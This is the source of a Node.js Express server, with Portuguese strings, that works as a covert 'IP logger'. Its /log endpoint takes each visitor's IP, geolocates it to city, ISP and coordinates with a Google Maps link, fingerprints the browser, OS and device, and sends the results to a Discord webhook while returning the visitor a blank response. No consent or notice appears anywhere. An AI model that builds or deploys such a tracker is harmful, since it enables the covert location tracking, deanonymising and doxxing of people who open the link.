const express = require("express");
const axios = require("axios");
const UAParser = require("ua-parser-js");

const app = express();
const PORT = process.env.PORT || 3000;

app.set("trust proxy", true);

app.use(express.static("public"));

async function getLocation(ip) {

  try {

    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,lat,lon,query`);

    if (res.data.status !== "success") return null;

    return res.data;

  } catch {
    return null;
  }

}

app.get("/log", async (req, res) => {

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    req.ip;

  const ua = req.headers["user-agent"] || "Desconhecido";

  const parser = new UAParser(ua);

  const browser = parser.getBrowser();
  const os = parser.getOS();
  const device = parser.getDevice();

  const deviceType = device.type || "Desktop";

  const browserName = browser.name || "Desconhecido";
  const browserVersion = browser.version || "";

  const osName = os.name || "Desconhecido";
  const osVersion = os.version || "";

  const hostname = req.hostname || "Desconhecido";

  const time = new Date().toLocaleString("pt-BR", {
    timeZone: "America/Sao_Paulo"
  });

  const location = await getLocation(ip);

  let city = "Desconhecido";
  let region = "";
  let country = "";
  let isp = "Desconhecido";
  let mapsLink = "Indisponível";
  let flag = "";

  if (location) {

    city = location.city;
    region = location.regionName;
    country = location.country;
    isp = location.isp;

    if (location.lat && location.lon) {
      mapsLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
    }

    flag = `https://flagsapi.com/${countryCode(location.country)}/flat/64.png`;

  }

  try {

    await axios.post(process.env.DISCORD_WEBHOOK, {

      username: "Advanced Logger",

      embeds: [
        {
          title: "📡 Nova visita detectada",
          color: 3447003,

          thumbnail: {
            url: flag
          },

          fields: [

            {
              name: "🌐 IP",
              value: ip,
              inline: false
            },

            {
              name: "📍 Localização",
              value: `${city}, ${region} - ${country}`,
              inline: false
            },

            {
              name: "🗺 Google Maps",
              value: mapsLink,
              inline: false
            },

            {
              name: "🏢 Provedor",
              value: isp,
              inline: false
            },

            {
              name: "📱 Dispositivo",
              value: deviceType,
              inline: true
            },

            {
              name: "🖥 Sistema",
              value: `${osName} ${osVersion}`,
              inline: true
            },

            {
              name: "🌎 Navegador",
              value: `${browserName} ${browserVersion}`,
              inline: true
            },

            {
              name: "🌍 Host",
              value: hostname,
              inline: false
            },

            {
              name: "🕒 Horário",
              value: time,
              inline: false
            }

          ],

          footer: {
            text: "Railway • Advanced Express Logger"
          }
        }
      ]

    });

  } catch (err) {

    console.error("Erro ao enviar webhook:", err.message);

  }

  res.sendStatus(204);

});

function countryCode(country) {

  const codes = {
    Brazil: "BR",
    "United States": "US",
    Portugal: "PT",
    Spain: "ES",
    France: "FR",
    Germany: "DE"
  };

  return codes[country] || "BR";

}

app.listen(PORT, () => {

  console.log(`Servidor rodando na porta ${PORT}`);

});
